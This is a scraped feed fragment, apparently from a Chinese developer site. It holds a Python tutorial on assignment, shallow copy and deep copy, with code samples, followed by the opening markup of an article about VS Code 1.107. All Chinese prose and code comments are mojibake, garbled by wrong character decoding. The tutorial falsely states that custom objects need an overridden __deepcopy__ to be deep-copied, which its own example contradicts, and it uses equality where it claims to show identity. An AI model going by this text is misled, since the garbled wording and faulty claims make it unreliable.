QHogRWYZSmwJ4Reh06nI2Nd7rYEA8zAzqXAxhgq/pc1d9vHKbEX+Dr4JbzypJDc/YxXYi/wifRLeOXpU5q7n/FK7EXsnBBeeRoqd7/EHj1ZhleeiMjdz8pArRKR+0pb+UsCuK0SkftKW/kzeFmrRHCAxWzufsaJOkqExWzufpOI8EpP1jnCJCK80pN1jjCJ4ICwMigidz/jRD3bI7bZUInIfaWt/KUSuK0SEd4jqFvufgYva5UIDrCYzd3POFFHifhfV/7k8lwPw7D5mUSEV3r854ju2pK7ffOIWzk/X+Go803Lr+ooGqoiwkyP9xzRXVt0q9sE3CgJYTLqfNPyE/irpkoEe2um6ck4bSiBSeD8JBl41jY/Hgd1lIiaaeoyLlsjgUGAjEH3DB4DtUpEW2Z3Mj5GAgA8efbVvXpX/200nln5IMYvKhHDrvylcwdc9+pSNdeg46WQsP7wo2s7fpWYaPT926fw9ZiVk4BpywYJkGuvlJs4EuWS0p/HTyHh3kbzH2najM85cR0lgpPiYMtukFB26m1u5Ua+vkFkWP3Zn0KCJDg1Px6f42Wtvhrhdyz8ncanrFKCmGH1wrwDMCrh/uxPIUFTAvdHbeVPsc1fVRE+c7Ud/k6fWt7XHFlYqcqQ5wTRvWpiY4wrIZwfDUL+akDRUBXB/jCzFCH9SHCzTDRUmsro7z+cEvrHwxOZn2ZTL/pVFcEBtRLoiWXfxQ5ehvoHHx4vpIwUEuJKSMvPz5/zQq0qwmIy5m+rjBQSwnsCQYnlgwjfT72av6oifOba2qnKcOXeGVIP0rT3BALTNr8mBWSpRHAgmJSTtLGhDHwj+A9GPCbX2DNiBSRoShg0H8zl5y/njxIhJ0WntralDJmIbO+UEvz85Zwt9wj7HIDB5Ttp7RkyGbRDSqC49vOjX50P9aexmr+qInzmajvtO13H02SpyrCVMNj8dT7/4BwByDXzRIC0LWXEldA/njVfip9GpV9VERxQM0lPhrVDyrCVMJr5/fwZJ+qWewR1lSuNJ21sXxnjVgIhck5VhM/cqG1WBpIAMX4Z9Xz+eP58sFUiOBArLQcZpQ0CNCXt1HzA5OfPOFGrrwYHyKTwbNJsxolaJUJbKeo0mu/4uMeXBHBbJSK88qP5jo97fAYva5UIDgivHEXk7mecqKNEhFeOhsjdbxKR+0pb+UsCuK0qIveVtvJn8LJWieAAi9nc/YwTdZQIi9nc/SYR4ZWenSO2yZvgcwTuRYZKWBnUI3e/xF7gcmio5L4HWPlL7AVuyPol95W28me8EnuBa8J+sZjM3c94JfYCd6VxTXjaCjDLe+K9cwTuSuOa8LQUYPXvh1d3w0HC7JK8kMK0/rcJfwHkVMYgi4xhOgAAAABJRU5ErkJggg==");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>å¼•è¨€ï¼š
åœ¨ Python ç¼–ç¨‹ä¸­ï¼Œèµ‹å€¼ã€æµ…æ‹·è´ã€æ·±æ‹·è´æ˜¯å¤„ç†æ•°æ®å¤åˆ¶æ—¶çš„æ ¸å¿ƒæ“ä½œ â€”â€” å¾ˆå¤šæ–°æ‰‹ä¼šå› æ··æ·†ä¸‰è€…çš„åŒºåˆ«ï¼Œå¯¼è‡´æ•°æ®è¢«æ„å¤–ä¿®æ”¹ï¼Œå¼•å‘éš¾ä»¥æ’æŸ¥çš„ bugã€‚æœ¬æ–‡èšç„¦<strong>æ·±æµ…æ‹·è´</strong>è¿™ä¸€æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼Œä»åº•å±‚åŸç†ã€ä½¿ç”¨åœºæ™¯åˆ°å®æˆ˜é¿å‘ï¼Œå¸¦ä½ å½»åº•æŒæ¡ä¸åŒæ‹·è´æ–¹å¼çš„æœ¬è´¨ï¼Œç²¾å‡†æ§åˆ¶æ•°æ®çš„å¤åˆ¶é€»è¾‘ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€æ·±æµ…æ‹·è´çš„æ ¸å¿ƒèƒŒæ™¯ï¼šPython çš„å¯¹è±¡å¼•ç”¨æœºåˆ¶</h2>
<p>è¦ç†è§£æ·±æµ…æ‹·è´ï¼Œé¦–å…ˆè¦æ˜ç¡® Python çš„æ ¸å¿ƒè§„åˆ™ï¼š<strong>å˜é‡å­˜å‚¨çš„ä¸æ˜¯æ•°æ®æœ¬èº«ï¼Œè€Œæ˜¯æ•°æ®å¯¹è±¡çš„å¼•ç”¨ï¼ˆå†…å­˜åœ°å€ï¼‰</strong> ã€‚</p>
<ul>
<li>ä¸å¯å˜å¯¹è±¡ï¼ˆintã€strã€tupleï¼‰ï¼šä¿®æ”¹æ—¶ä¼šåˆ›å»ºæ–°å¯¹è±¡ï¼ŒåŸå¼•ç”¨æŒ‡å‘æ–°åœ°å€ï¼›</li>
<li>å¯å˜å¯¹è±¡ï¼ˆlistã€dictã€setï¼‰ï¼šä¿®æ”¹æ—¶ä¸ä¼šåˆ›å»ºæ–°å¯¹è±¡ï¼Œè€Œæ˜¯ç›´æ¥ä¿®æ”¹åŸåœ°å€çš„æ•°æ®ï¼Œæ‰€æœ‰æŒ‡å‘è¯¥åœ°å€çš„å˜é‡éƒ½ä¼šå—å½±å“ã€‚</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç¤ºä¾‹ï¼šå¯å˜å¯¹è±¡çš„å¼•ç”¨ç‰¹æ€§</span>
a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
b = a  <span class="hljs-comment"># èµ‹å€¼ï¼šbå’ŒaæŒ‡å‘åŒä¸€ä¸ªåˆ—è¡¨å¯¹è±¡</span>
b.append(<span class="hljs-number">4</span>)
<span class="hljs-built_in">print</span>(a)  <span class="hljs-comment"># è¾“å‡ºï¼š[1,2,3,4]ï¼ˆaä¹Ÿè¢«ä¿®æ”¹ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(a) == <span class="hljs-built_in">id</span>(b))  <span class="hljs-comment"># è¾“å‡ºï¼šTrueï¼ˆå†…å­˜åœ°å€ç›¸åŒï¼‰</span>
</code></pre>
<p>èµ‹å€¼ä»…ä¼ é€’å¼•ç”¨ï¼Œè€Œéå¤åˆ¶æ•°æ® â€”â€” è¿™ä¹Ÿæ˜¯æ·±æµ…æ‹·è´å­˜åœ¨çš„æ ¸å¿ƒåŸå› ï¼šå½“éœ€è¦ â€œçœŸæ­£å¤åˆ¶â€ æ•°æ®ï¼Œè€Œéå…±äº«å¼•ç”¨æ—¶ï¼Œå°±éœ€è¦ç”¨åˆ°æ‹·è´æ“ä½œã€‚</p>
<h2 data-id="heading-1">äºŒã€æµ…æ‹·è´ï¼ˆShallow Copyï¼‰ï¼šä»…å¤åˆ¶è¡¨å±‚ç»“æ„</h2>
<h3 data-id="heading-2">1. æµ…æ‹·è´çš„å®šä¹‰</h3>
<p>æµ…æ‹·è´ä¼šåˆ›å»ºä¸€ä¸ª<strong>æ–°çš„å®¹å™¨å¯¹è±¡</strong>ï¼Œä½†å®¹å™¨å†…çš„å…ƒç´ ä¾ç„¶å¼•ç”¨åŸå¯¹è±¡çš„å…ƒç´ ï¼ˆå³åªæ‹·è´ â€œç¬¬ä¸€å±‚â€ï¼Œæ·±å±‚å…ƒç´ ä»å…±äº«å¼•ç”¨ï¼‰ã€‚</p>
<h3 data-id="heading-3">2. æµ…æ‹·è´çš„å®ç°æ–¹å¼</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-comment"># åŸæ•°æ®ï¼šåµŒå¥—å¯å˜å¯¹è±¡ï¼ˆåˆ—è¡¨åŒ…å«åˆ—è¡¨ï¼‰</span>
original = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-number">4</span>]

<span class="hljs-comment"># æ–¹å¼1ï¼šä½¿ç”¨copyæ¨¡å—çš„copy()å‡½æ•°ï¼ˆæ¨èï¼‰</span>
shallow1 = copy.copy(original)
<span class="hljs-comment"># æ–¹å¼2ï¼šåˆ—è¡¨åˆ‡ç‰‡ï¼ˆä»…é€‚ç”¨äºåºåˆ—ç±»å‹ï¼‰</span>
shallow2 = original[:]
<span class="hljs-comment"># æ–¹å¼3ï¼šå¯¹è±¡çš„copyæ–¹æ³•ï¼ˆå¦‚list.copy()ï¼‰</span>
shallow3 = original.copy()

<span class="hljs-comment"># éªŒè¯ï¼šæ–°å¯¹è±¡ä¸åŸå¯¹è±¡åœ°å€ä¸åŒï¼ˆè¡¨å±‚å·²æ‹·è´ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(original) != <span class="hljs-built_in">id</span>(shallow1))  <span class="hljs-comment"># è¾“å‡ºï¼šTrue</span>

<span class="hljs-comment"># éªŒè¯ï¼šæ·±å±‚å…ƒç´ ä»å…±äº«å¼•ç”¨</span>
shallow1[<span class="hljs-number">1</span>].append(<span class="hljs-number">5</span>)
<span class="hljs-built_in">print</span>(original[<span class="hljs-number">1</span>])  <span class="hljs-comment"># è¾“å‡ºï¼š[2,3,5]ï¼ˆåŸæ•°æ®çš„æ·±å±‚åˆ—è¡¨è¢«ä¿®æ”¹ï¼‰</span>
<span class="hljs-built_in">print</span>(shallow1[<span class="hljs-number">1</span>] == original[<span class="hljs-number">1</span>])   <span class="hljs-comment"># è¾“å‡ºï¼šTrueï¼ˆåœ°å€ç›¸åŒï¼‰</span>
</code></pre>
<h3 data-id="heading-4">3. æµ…æ‹·è´çš„é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>æ•°æ®ä¸º<strong>å•å±‚ç»“æ„</strong>çš„å¯å˜å¯¹è±¡ï¼ˆå¦‚Â <code>[1,2,3]</code>ã€<code>{"a":1}</code>ï¼‰ï¼›</li>
<li>æ— éœ€ä¿®æ”¹æ·±å±‚å…ƒç´ ï¼Œä»…éœ€ç‹¬ç«‹æ“ä½œè¡¨å±‚ç»“æ„çš„åœºæ™¯ï¼›</li>
<li>è¿½æ±‚æ‹·è´æ•ˆç‡ï¼ˆæµ…æ‹·è´æ¯”æ·±æ‹·è´æ›´å¿«ï¼Œå ç”¨å†…å­˜æ›´å°‘ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-5">ä¸‰ã€æ·±æ‹·è´ï¼ˆDeep Copyï¼‰ï¼šå®Œå…¨å¤åˆ¶æ‰€æœ‰å±‚çº§</h2>
<h3 data-id="heading-6">1. æ·±æ‹·è´çš„å®šä¹‰</h3>
<p>æ·±æ‹·è´ä¼šåˆ›å»ºä¸€ä¸ª<strong>å…¨æ–°çš„ç‹¬ç«‹å¯¹è±¡</strong>ï¼Œé€’å½’å¤åˆ¶åŸå¯¹è±¡çš„æ‰€æœ‰å±‚çº§å…ƒç´  â€”â€” æ–°å¯¹è±¡ä¸åŸå¯¹è±¡å®Œå…¨éš”ç¦»ï¼Œä¿®æ”¹ä»»æ„å±‚çº§çš„å…ƒç´ éƒ½ä¸ä¼šå½±å“å¯¹æ–¹ã€‚</p>
<h3 data-id="heading-7">2. æ·±æ‹·è´çš„å®ç°æ–¹å¼</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-comment"># åŸæ•°æ®ï¼šåµŒå¥—å¯å˜å¯¹è±¡</span>
original = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-number">4</span>]

<span class="hljs-comment"># ä½¿ç”¨copyæ¨¡å—çš„deepcopy()å‡½æ•°</span>
deep = copy.deepcopy(original)

<span class="hljs-comment"># éªŒè¯ï¼šæ–°å¯¹è±¡ä¸åŸå¯¹è±¡åœ°å€ä¸åŒ</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(original) != <span class="hljs-built_in">id</span>(deep))  <span class="hljs-comment"># è¾“å‡ºï¼šTrue</span>

<span class="hljs-comment"># éªŒè¯ï¼šæ·±å±‚å…ƒç´ ä¹Ÿå®Œå…¨ç‹¬ç«‹</span>
deep[<span class="hljs-number">1</span>].append(<span class="hljs-number">5</span>)
<span class="hljs-built_in">print</span>(original[<span class="hljs-number">1</span>])  <span class="hljs-comment"># è¾“å‡ºï¼š[2,3]ï¼ˆåŸæ•°æ®ä¸å—å½±å“ï¼‰</span>
<span class="hljs-built_in">print</span>(deep[<span class="hljs-number">1</span>])      <span class="hljs-comment"># è¾“å‡ºï¼š[2,3,5]ï¼ˆä»…æ·±æ‹·è´å¯¹è±¡è¢«ä¿®æ”¹ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(original[<span class="hljs-number">1</span>]) != <span class="hljs-built_in">id</span>(deep[<span class="hljs-number">1</span>]))  <span class="hljs-comment"># è¾“å‡ºï¼šTrueï¼ˆæ·±å±‚åœ°å€ä¸åŒï¼‰</span>
</code></pre>
<h3 data-id="heading-8">3. æ·±æ‹·è´çš„é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>æ•°æ®åŒ…å«<strong>åµŒå¥—å¯å˜å¯¹è±¡</strong>ï¼ˆå¦‚Â <code>[[1,2], [3,4]]</code>ã€<code>{"info": {"age": 20}}</code>ï¼‰ï¼›</li>
<li>éœ€è¦å®Œå…¨ç‹¬ç«‹æ“ä½œæ•°æ®ï¼Œé¿å…ä¿®æ”¹ç›¸äº’å½±å“çš„åœºæ™¯ï¼›</li>
<li>æ•°æ®æŒä¹…åŒ–ã€æ•°æ®å¤‡ä»½ç­‰éœ€è¦ â€œçº¯å‡€å‰¯æœ¬â€ çš„åœºæ™¯ã€‚</li>
</ul>
<h2 data-id="heading-9">å››ã€èµ‹å€¼ã€æµ…æ‹·è´ã€æ·±æ‹·è´å¯¹æ¯”</h2>
<p>ä¸ºäº†æ›´æ¸…æ™°åŒºåˆ†ä¸‰è€…ï¼Œæˆ‘ä»¬ç”¨è¡¨æ ¼æ€»ç»“æ ¸å¿ƒå·®å¼‚ï¼š</p>

































<table><thead><tr><th>æ“ä½œæ–¹å¼</th><th>æ˜¯å¦åˆ›å»ºæ–°å¯¹è±¡</th><th>è¡¨å±‚å…ƒç´ æ˜¯å¦ç‹¬ç«‹</th><th>æ·±å±‚å…ƒç´ æ˜¯å¦ç‹¬ç«‹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>èµ‹å€¼</td><td>âŒ å¦</td><td>âŒ å…±äº«</td><td>âŒ å…±äº«</td><td>ä»…éœ€å¼•ç”¨æ•°æ®ï¼Œæ— éœ€ç‹¬ç«‹æ“ä½œ</td></tr><tr><td>æµ…æ‹·è´</td><td>âœ… æ˜¯</td><td>âœ… ç‹¬ç«‹</td><td>âŒ å…±äº«</td><td>å•å±‚å¯å˜å¯¹è±¡ã€è¿½æ±‚æ‹·è´æ•ˆç‡</td></tr><tr><td>æ·±æ‹·è´</td><td>âœ… æ˜¯</td><td>âœ… ç‹¬ç«‹</td><td>âœ… ç‹¬ç«‹</td><td>åµŒå¥—å¯å˜å¯¹è±¡ã€éœ€å®Œå…¨éš”ç¦»æ•°æ®</td></tr></tbody></table>
<h3 data-id="heading-10">å®æˆ˜å¯¹æ¯”ç¤ºä¾‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-comment"># åŸæ•°æ®</span>
data = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-string">"scores"</span>: [<span class="hljs-number">80</span>, <span class="hljs-number">90</span>]}

<span class="hljs-comment"># 1. èµ‹å€¼</span>
assign = data
assign[<span class="hljs-string">"scores"</span>].append(<span class="hljs-number">95</span>)
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"scores"</span>])  <span class="hljs-comment"># [80,90,95]ï¼ˆåŸæ•°æ®è¢«æ”¹ï¼‰</span>

<span class="hljs-comment"># é‡ç½®åŸæ•°æ®</span>
data = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-string">"scores"</span>: [<span class="hljs-number">80</span>, <span class="hljs-number">90</span>]}

<span class="hljs-comment"># 2. æµ…æ‹·è´</span>
shallow = copy.copy(data)
shallow[<span class="hljs-string">"scores"</span>].append(<span class="hljs-number">95</span>)
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"scores"</span>])  <span class="hljs-comment"># [80,90,95]ï¼ˆæ·±å±‚ä»è¢«æ”¹ï¼‰</span>
shallow[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"Bob"</span>
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"name"</span>])    <span class="hljs-comment"># Aliceï¼ˆè¡¨å±‚ç‹¬ç«‹ï¼‰</span>

<span class="hljs-comment"># é‡ç½®åŸæ•°æ®</span>
data = {<span class="hljs-string">"name"</span>: <span class="hljs-string">"Alice"</span>, <span class="hljs-string">"scores"</span>: [<span class="hljs-number">80</span>, <span class="hljs-number">90</span>]}

<span class="hljs-comment"># 3. æ·±æ‹·è´</span>
deep = copy.deepcopy(data)
deep[<span class="hljs-string">"scores"</span>].append(<span class="hljs-number">95</span>)
deep[<span class="hljs-string">"name"</span>] = <span class="hljs-string">"Bob"</span>
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"scores"</span>])  <span class="hljs-comment"># [80,90]ï¼ˆå®Œå…¨ä¸å—å½±å“ï¼‰</span>
<span class="hljs-built_in">print</span>(data[<span class="hljs-string">"name"</span>])    <span class="hljs-comment"># Alice</span>
</code></pre>
<h2 data-id="heading-11">äº”ã€æ·±æµ…æ‹·è´çš„é¿å‘è¦ç‚¹</h2>
<h3 data-id="heading-12">1. ä¸å¯å˜å¯¹è±¡çš„æ‹·è´ â€œç‰¹ä¾‹â€</h3>
<p>å¯¹ä¸å¯å˜å¯¹è±¡ï¼ˆintã€strã€tupleï¼‰æ‰§è¡Œæ·±æµ…æ‹·è´ï¼Œç»“æœç­‰åŒäºèµ‹å€¼ â€”â€” å› ä¸ºä¸å¯å˜å¯¹è±¡æ— æ³•ä¿®æ”¹ï¼ŒPython ä¼šä¼˜åŒ–ä¸ºå…±äº«å¼•ç”¨ï¼Œé¿å…ä¸å¿…è¦çš„å†…å­˜æ¶ˆè€—ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

a = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <span class="hljs-comment"># ä¸å¯å˜å…ƒç»„</span>
b = copy.copy(a)
c = copy.deepcopy(a)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(a) == <span class="hljs-built_in">id</span>(b) == <span class="hljs-built_in">id</span>(c))  <span class="hljs-comment"># è¾“å‡ºï¼šTrue</span>
</code></pre>
<h3 data-id="heading-13">2. å¾ªç¯å¼•ç”¨çš„å¤„ç†</h3>
<p>æ·±æ‹·è´èƒ½è‡ªåŠ¨å¤„ç†å¾ªç¯å¼•ç”¨ï¼ˆå¯¹è±¡å¼•ç”¨è‡ªèº«ï¼‰ï¼Œè€Œæµ…æ‹·è´ä¼šä¿ç•™å¾ªç¯å¼•ç”¨ï¼Œå¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-comment"># å¾ªç¯å¼•ç”¨ï¼šåˆ—è¡¨å¼•ç”¨è‡ªèº«</span>
lst = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]
lst.append(lst)

<span class="hljs-comment"># æ·±æ‹·è´ï¼šæ­£ç¡®å¤„ç†å¾ªç¯å¼•ç”¨</span>
deep_lst = copy.deepcopy(lst)
<span class="hljs-built_in">print</span>(deep_lst[-<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> deep_lst)  <span class="hljs-comment"># è¾“å‡ºï¼šTrueï¼ˆæ–°çš„å¾ªç¯å¼•ç”¨ï¼‰</span>

<span class="hljs-comment"># æµ…æ‹·è´ï¼šä¿ç•™åŸå¾ªç¯å¼•ç”¨</span>
shallow_lst = copy.copy(lst)
<span class="hljs-built_in">print</span>(shallow_lst[-<span class="hljs-number">1</span>] <span class="hljs-keyword">is</span> lst)    <span class="hljs-comment"># è¾“å‡ºï¼šTrueï¼ˆå¼•ç”¨åŸåˆ—è¡¨ï¼‰</span>
</code></pre>
<h3 data-id="heading-14">3. è‡ªå®šä¹‰å¯¹è±¡çš„æ‹·è´</h3>
<p>è‡ªå®šä¹‰ç±»çš„å®ä¾‹é»˜è®¤ä½¿ç”¨æµ…æ‹·è´ï¼Œè‹¥éœ€æ·±æ‹·è´ï¼Œéœ€é‡å†™Â <code>__deepcopy__</code>Â æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> copy

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, hobbies</span>):
        self.name = name
        self.hobbies = hobbies  <span class="hljs-comment"># å¯å˜å¯¹è±¡ï¼ˆåˆ—è¡¨ï¼‰</span>

<span class="hljs-comment"># è‡ªå®šä¹‰å¯¹è±¡çš„æµ…æ‹·è´</span>
p1 = Person(<span class="hljs-string">"Alice"</span>, [<span class="hljs-string">"reading"</span>, <span class="hljs-string">"running"</span>])
p2 = copy.copy(p1)
p2.hobbies.append(<span class="hljs-string">"swimming"</span>)
<span class="hljs-built_in">print</span>(p1.hobbies)  <span class="hljs-comment"># ['reading', 'running', 'swimming']ï¼ˆè¢«ä¿®æ”¹ï¼‰</span>

<span class="hljs-comment"># è‡ªå®šä¹‰å¯¹è±¡çš„æ·±æ‹·è´</span>
p3 = copy.deepcopy(p1)
p3.hobbies.append(<span class="hljs-string">"cooking"</span>)
<span class="hljs-built_in">print</span>(p1.hobbies)  <span class="hljs-comment"># ['reading', 'running', 'swimming']ï¼ˆä¸å—å½±å“ï¼‰</span>
</code></pre>
<h2 data-id="heading-15">æ€»ç»“</h2>
<ol>
<li>Python ä¸­å˜é‡å­˜å‚¨çš„æ˜¯å¯¹è±¡å¼•ç”¨ï¼Œèµ‹å€¼ä»…ä¼ é€’å¼•ç”¨ï¼Œä¸ä¼šåˆ›å»ºæ–°å¯¹è±¡ï¼›</li>
<li>æµ…æ‹·è´ï¼ˆ<code>copy.copy()</code>ï¼‰åˆ›å»ºæ–°çš„è¡¨å±‚å¯¹è±¡ï¼Œæ·±å±‚å…ƒç´ ä»å…±äº«å¼•ç”¨ï¼Œé€‚ç”¨äºå•å±‚å¯å˜å¯¹è±¡ï¼›</li>
<li>æ·±æ‹·è´ï¼ˆ<code>copy.deepcopy()</code>ï¼‰é€’å½’å¤åˆ¶æ‰€æœ‰å±‚çº§å…ƒç´ ï¼Œæ–°å¯¹è±¡ä¸åŸå¯¹è±¡å®Œå…¨éš”ç¦»ï¼Œé€‚ç”¨äºåµŒå¥—å¯å˜å¯¹è±¡ï¼›</li>
<li>ä¸å¯å˜å¯¹è±¡çš„æ·±æµ…æ‹·è´ç­‰åŒäºèµ‹å€¼ï¼Œæ·±æ‹·è´å¯å¤„ç†å¾ªç¯å¼•ç”¨ï¼Œæ˜¯æ•°æ®å®Œå…¨éš”ç¦»çš„é¦–é€‰æ–¹å¼</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VS Code 1.107 å‘å¸ƒï¼šAI ä¸å†æ˜¯æ’ä»¶ï¼Œè€Œæ˜¯ç¼–è¾‘å™¨çš„ã€Œç¬¬ä¸€å¤§è„‘ã€]]></title>    <link>https://juejin.cn/post/7589835342146125834</link>    <guid>https://juejin.cn/post/7589835342146125834</guid>    <pubDate>2026-01-01T00:54:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589835342146125834" data-draft-id="7582783931164311587" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VS Code 1.107 å‘å¸ƒï¼šAI ä¸å†æ˜¯æ’ä»¶ï¼Œè€Œæ˜¯ç¼–è¾‘å™¨çš„ã€Œç¬¬ä¸€å¤§è„‘ã€"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-01T00:54:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="golangå­¦ä¹ è®°"/> <meta itemprop="url" content="https://juejin.cn/user/4371313964100990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VS Code 1.107 å‘å¸ƒï¼šAI ä¸å†æ˜¯æ’ä»¶ï¼Œè€Œæ˜¯ç¼–è¾‘å™¨çš„ã€Œç¬¬ä¸€å¤§è„‘ã€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313964100990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    golangå­¦ä¹ è®°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T00:54:09.000Z" title="Thu Jan 01 2026 00:54:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body 